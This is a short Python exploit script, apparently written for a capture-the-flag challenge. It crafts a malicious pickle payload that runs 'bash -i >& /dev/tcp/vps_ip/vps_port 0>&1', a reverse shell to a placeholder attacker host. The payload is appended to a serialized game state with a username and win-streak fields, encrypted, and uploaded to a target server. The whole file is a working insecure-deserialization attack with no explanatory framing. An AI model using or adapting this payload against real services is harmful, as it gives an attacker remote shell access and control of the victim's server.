import base64
import dis
import pickle

import requests
import pickletools
from sign import encrypt, decrypt

payload = b'''csubprocess
run
(]S'bash'
aS'-c'
aS'bash -i >& /dev/tcp/vps_ip/vps_port 0>&1'
atR0.
'''

opcode = b'\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x08username\x94\x8c\x04nemo\x94\x8c\nwin_streak\x94K\x02\x8c\x0ehighest_streak\x94J\xe8\x03\x00\x00u'
opcode += payload

url = "http://10.10.175.100:34497"
session = requests.Session()

session = requests.get(url=url)

# 加密数据
enc_data = encrypt(opcode)

r = requests.post(
    url=f"{url}/upload",
    files={
        ("file", ("test", enc_data))
    },
)

print(r.text)
